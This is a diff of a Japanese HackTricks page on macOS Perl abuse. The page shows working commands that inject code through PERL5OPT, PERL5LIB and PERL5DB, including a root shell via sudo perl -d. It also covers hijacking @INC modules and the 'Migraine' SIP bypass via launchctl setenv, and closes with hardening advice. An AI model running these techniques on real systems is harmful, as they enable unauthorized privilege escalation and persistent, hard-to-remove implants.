@@ -2,50 +2,51 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## `PERL5OPT` と `PERL5LIB` 環境変数を使用して
+## Via `PERL5OPT` & `PERL5LIB` env variable
 
-環境変数 **`PERL5OPT`** を使用すると、**Perl** がインタープリタが起動する際に任意のコマンドを実行することが可能です（ターゲットスクリプトの最初の行が解析される**前に**でも）。  
-例えば、このスクリプトを作成します:
+env variable **`PERL5OPT`** を使用すると、**Perl** の interpreter 起動時に任意のコマンドを実行させることが可能です（target script の最初の行が解析される前であっても実行されます）。
+例えば、次の script を作成します:
 ```perl:test.pl
 #!/usr/bin/perl
 print "Hello from the Perl script!\n";
 ```
-今、**env変数をエクスポート**し、**perl**スクリプトを実行します:
+ここで **env 変数を export** し、**perl** スクリプトを実行します：
 ```bash
 export PERL5OPT='-Mwarnings;system("whoami")'
 perl test.pl # This will execute "whoami"
 ```
-別のオプションは、Perlモジュールを作成することです（例：`/tmp/pmod.pm`）：
+別の選択肢として、Perl module（例: `/tmp/pmod.pm`）を作成します：
 ```perl:/tmp/pmod.pm
 #!/usr/bin/perl
 package pmod;
 system('whoami');
 1; # Modules must return a true value
 ```
-そして、env変数を使用して、モジュールが自動的に見つかり、ロードされるようにします：
+そして、環境変数を使用して、モジュールが自動的に見つけられてロードされるようにします：
 ```bash
 PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
 ```
 ### その他の興味深い環境変数
 
-* **`PERL5DB`** – インタプリタが **`-d`** (デバッガ) フラグで起動されると、`PERL5DB` の内容がデバッガのコンテキスト内で Perl コードとして実行されます。特権のある Perl プロセスの環境 **と** コマンドラインフラグの両方に影響を与えることができれば、次のようなことができます：
+* **`PERL5DB`** – interpreter が **`-d`** (debugger) flag 付きで起動された場合、`PERL5DB` の内容は debugger context *inside* で Perl code として実行されます。
+環境 **and** privileged Perl process の command-line flags の両方に影響を与えられる場合、次のようなことができます。
 
 ```bash
 export PERL5DB='system("/bin/zsh")'
-sudo perl -d /usr/bin/some_admin_script.pl   # スクリプトを実行する前にシェルを起動します
+sudo perl -d /usr/bin/some_admin_script.pl   # script の実行前に shell が起動する
 ```
 
-* **`PERL5SHELL`** – Windows では、この変数は Perl がシェルを生成する必要があるときに使用するシェル実行可能ファイルを制御します。これは macOS では関連性がないため、完全性のためにのみここに言及されています。
+* **`PERL5SHELL`** – Windows では、shell の spawn が必要な場合に Perl が使用する shell executable をこの variable で制御します。macOS では relevant ではないため、ここでは completeness のために記載します。
 
-`PERL5DB` は `-d` スイッチを必要としますが、冗長なトラブルシューティングのためにこのフラグが有効な状態で *root* として実行されるメンテナンスやインストーラスクリプトを見つけることは一般的であり、この変数は有効なエスカレーションベクターとなります。
+`PERL5DB` には **`-d`** switch が必要ですが、verbose troubleshooting のためにこの flag を有効にした状態で *root* として実行される maintenance または installer scripts が見つかることは一般的です。そのため、この variable は有効な escalation vector になります。
 
-## 依存関係を介して (@INC の悪用)
+## dependencies 経由 (`@INC` abuse)
 
-Perl が検索するインクルードパス (**`@INC`**) をリストすることが可能です：
+Perl が検索する include path (**`@INC`**) は、次のコマンドを実行することで一覧表示できます。
 ```bash
 perl -e 'print join("\n", @INC)'
 ```
-macOS 13/14の典型的な出力は次のようになります:
+macOS 13/14での一般的な出力は次のようになります。
 ```bash
 /Library/Perl/5.30/darwin-thread-multi-2level
 /Library/Perl/5.30
@@ -57,22 +58,23 @@ macOS 13/14の典型的な出力は次のようになります:
 /System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
 /System/Library/Perl/Extras/5.30
 ```
-いくつかの返されたフォルダーは存在しませんが、**`/Library/Perl/5.30`** は存在し、SIPによって保護されておらず、SIPで保護されたフォルダーの*前*にあります。したがって、*root*として書き込むことができれば、悪意のあるモジュール（例：`File/Basename.pm`）をドロップすることができ、そのモジュールをインポートする特権スクリプトによって*優先的に*読み込まれます。
+返されるフォルダの一部は実際には存在しません。しかし、**`/Library/Perl/5.30`** は存在し、SIP によって保護されておらず、SIP によって保護されたフォルダよりも前に配置されています。したがって、*root* として書き込み可能であれば、悪意のあるモジュール（例：`File/Basename.pm`）を配置し、そのモジュールを import する特権スクリプトによって *優先的に* 読み込ませることができます。
 
 > [!WARNING]
-> `/Library/Perl` 内に書き込むには依然として**root**が必要であり、macOSは書き込み操作を行うプロセスに対して*フルディスクアクセス*を要求する**TCC**プロンプトを表示します。
+> `/Library/Perl` 内に書き込むには、依然として **root** が必要です。また、macOS は書き込み操作を実行するプロセスに対して、*Full Disk Access* を求める **TCC** プロンプトを表示します。
 
-例えば、スクリプトが **`use File::Basename;`** をインポートしている場合、攻撃者が制御するコードを含む `/Library/Perl/5.30/File/Basename.pm` を作成することが可能です。
+たとえば、あるスクリプトが **`use File::Basename;`** を import している場合、攻撃者が制御するコードを含む `/Library/Perl/5.30/File/Basename.pm` を作成できます。
 
-## Migration Assistantを介したSIPバイパス (CVE-2023-32369 “Migraine”)
+## Migration Assistant 経由の SIP bypass（CVE-2023-32369 “Migraine”）
 
-2023年5月、Microsoftは**CVE-2023-32369**を開示しました。これは**Migraine**と呼ばれる、*root*攻撃者がシステム整合性保護（SIP）を完全に**バイパス**することを可能にするポストエクスプロイト技術です。脆弱なコンポーネントは**`systemmigrationd`**であり、**`com.apple.rootless.install.heritable`**という権限を持つデーモンです。このデーモンによって生成された子プロセスはすべてその権限を継承し、したがってSIPの制限の**外部**で実行されます。
+2023 年 5 月、Microsoft は **CVE-2023-32369**、通称 **Migraine** を開示しました。これは、*root* attacker が System Integrity Protection（SIP）を完全に **bypass** できる post-exploitation technique です。
+脆弱な component は **`systemmigrationd`** で、**`com.apple.rootless.install.heritable`** entitlement が付与された daemon です。この daemon が spawn する child process は entitlement を継承するため、SIP の制限を受けずに実行されます。<sup>[1]</sup>
 
-研究者によって特定された子プロセスの中には、Appleが署名したインタープリターがあります：
+researcher によって特定された child の中には、Apple が署名した interpreter も含まれています。<sup>[1]</sup>
 ```
 /usr/bin/perl /usr/libexec/migrateLocalKDC …
 ```
-Perlは`PERL5OPT`を尊重し（Bashは`BASH_ENV`を尊重します）、デーモンの*環境*を汚染するだけで、SIPなしのコンテキストで任意の実行を得るのに十分です：
+Perlは`PERL5OPT`（Bashは`BASH_ENV`）を尊重するため、daemonの*環境*をpoisoningするだけで、SIPなしのコンテキストで任意のコード実行が可能になります:<sup>[1][2]</sup>
 ```bash
 # As root
 launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'
@@ -80,20 +82,20 @@ launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'
 # Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
 open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
 ```
-`migrateLocalKDC`が実行されると、`/usr/bin/perl`が悪意のある`PERL5OPT`で起動し、SIPが再有効化される前に`/private/tmp/migraine.sh`を実行します。そのスクリプトから、例えば、**`/System/Library/LaunchDaemons`**内にペイロードをコピーしたり、ファイルを**削除不可能**にするために`com.apple.rootless`拡張属性を割り当てたりできます。
+`migrateLocalKDC`が実行されると、`/usr/bin/perl`は悪意のある`PERL5OPT`を指定した状態で起動し、*SIPが再有効化される前に*`/private/tmp/migraine.sh`を実行します。このスクリプトから、たとえばペイロードを**`/System/Library/LaunchDaemons`**内にコピーしたり、`com.apple.rootless`拡張属性を割り当ててファイルを**削除不能**にしたりできます。
 
-AppleはmacOS **Ventura 13.4**、**Monterey 12.6.6**、および**Big Sur 11.7.7**でこの問題を修正しましたが、古いまたはパッチが適用されていないシステムは引き続き悪用可能です。
+AppleはmacOS **Ventura 13.4**、**Monterey 12.6.6**、**Big Sur 11.7.7**でこの問題を修正しましたが、古いシステムやパッチ未適用のシステムは引き続きexploit可能です。<sup>[1]</sup>
 
-## ハードニング推奨事項
+## Hardeningの推奨事項
 
-1. **危険な変数をクリアする** – 特権のあるlaunchdaemonsやcronジョブは、クリーンな環境で開始するべきです（`launchctl unsetenv PERL5OPT`、`env -i`など）。
-2. **必要不可欠でない限り、rootとしてインタプリタを実行しない**。コンパイルされたバイナリを使用するか、早期に権限を降下させます。
-3. **ベンダースクリプトに`-T`（汚染モード）を使用する**ことで、Perlが汚染チェックが有効なときに`PERL5OPT`やその他の安全でないスイッチを無視します。
-4. **macOSを最新の状態に保つ** – “Migraine”は現在のリリースで完全にパッチが適用されています。
+1. **危険な変数をクリアする** – 特権launchdaemonやcronジョブは、クリーンな環境で開始する必要があります（`launchctl unsetenv PERL5OPT`、`env -i`など）。
+2. **必要不可欠な場合を除き、interpreterをrootとして実行しない**。コンパイル済みバイナリを使用するか、早い段階でprivilegeをdropします。
+3. **vendor scriptでは`-T`（taint mode）を使用する**。taint checkingが有効な場合、Perlは`PERL5OPT`やその他の安全でないswitchを無視します。
+4. **macOSを最新の状態に保つ** – 「Migraine」は現行リリースで完全にpatch済みです。
 
-## 参考文献
+## References
 
-- Microsoft Security Blog – “新しいmacOSの脆弱性、MigraineはSystem Integrity Protectionをバイパスする可能性があります”（CVE-2023-32369）、2023年5月30日。
-- Hackyboiz – “macOS SIPバイパス（PERL5OPT & BASH_ENV）研究”、2025年5月。
+- [1] [Microsoft Security Blog – 新たなmacOSの脆弱性MigraineによりSystem Integrity Protectionをbypass可能（CVE-2023-32369）](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
+- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)
 
 {{#include ../../../banners/hacktricks-training.md}}
